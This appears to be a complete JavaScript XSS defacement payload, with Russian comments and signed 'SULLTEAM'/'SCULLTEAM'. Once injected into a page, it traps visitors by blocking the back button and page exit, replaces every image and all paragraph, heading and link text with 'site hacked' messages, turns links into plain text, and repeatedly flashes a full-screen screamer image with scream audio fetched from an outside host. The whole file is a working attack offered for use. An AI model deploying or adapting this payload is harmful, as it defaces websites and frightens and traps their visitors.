alert('𓂀H4CK3D BY SULLTEAM𓂀');

// Отмена возврата (частично)

window.history.pushState(null, null, window.location.href);

window.onpopstate = function(event) {
    window.history.pushState(null, null, window.location.href);
};

window.addEventListener('beforeunload', function (e) {
    e.preventDefault();
    e.returnValue = '';
});


// Запуск музыки

setTimeout(function () {
    var scaryMusic = document.createElement("audio");
    scaryMusic.src = "https://scullteam.github.io/XSS/scary.mp3";
    scaryMusic.play();
}, 1000);


// Замена изображений

var images = document.getElementsByTagName("img");
var replacementPath = "https://i.pinimg.com/736x/34/87/0b/34870b74942ca44221e4c78997498d9b.jpg";

for (var i = 0; i < images.length; i++) {
    images[i].src = replacementPath;
}


// Замена текста

var paragraphsForReplace = document.getElementsByTagName("p");
var h1ForReplace = document.getElementsByTagName("h1");
var linksForReplace = document.getElementsByTagName("a");
var replacementText = "HEY, TURN AROUND, TURN AROUND, TURN AROUND";
var replacementLinkText = "𓂀𓄿𓆷𓊽𓏤𓏤𓋴𓇽SITE HACKED BY SCULLTEAM𓃀𓂋𓉔𓍯𓏁𓏉𓌆𓎡𓎡";

for (var i = 0; i < paragraphsForReplace.length; i++) {
    paragraphsForReplace[i].textContent = replacementText;
}

for (var i = 0; i < h1ForReplace.length; i++) {
    h1ForReplace[i].textContent = replacementText;
}

for (var i = 0; i < linksForReplace.length; i++) {
    linksForReplace[i].textContent = replacementLinkText;
}


// Замена <a> на <p>

var links = Array.from(document.getElementsByTagName("a"));

links.forEach(function(link) {
    var newParagraph = document.createElement("p");
    newParagraph.textContent = link.textContent;

    for (var attr, i = 0, attrs = link.attributes, l = attrs.length; i < l; i++) {
        attr = attrs[i];
        newParagraph.setAttribute(attr.name, attr.value);
    }

    link.parentNode.replaceChild(newParagraph, link);
});


// Скример на весь экран + запуск крика

function showFullScreenImg() {
    var fullScreenImg = document.createElement("img");
    fullScreenImg.id = "fullScreenImg";
    fullScreenImg.src = "https://wallpapers.com/images/high/scary-face-pictures-fvx05bim45ctjiwh.webp";

    var audio = document.createElement("audio");
    audio.src = "https://scullteam.github.io/XSS/krik.mp3";

    document.body.appendChild(fullScreenImg);
    document.body.appendChild(audio);

    fullScreenImg.style.display = "block";
    audio.play();

    setTimeout(function () {
        fullScreenImg.style.display = "none";
    }, 800);
}

setTimeout(showFullScreenImg, 6000);
setTimeout(showFullScreenImg, 13000);
setTimeout(showFullScreenImg, 25000);
setTimeout(showFullScreenImg, 45000);
setTimeout(showFullScreenImg, 75000);
setTimeout(showFullScreenImg, 90000);
setTimeout(showFullScreenImg, 105000);
setTimeout(showFullScreenImg, 120000);
setTimeout(showFullScreenImg, 135000);
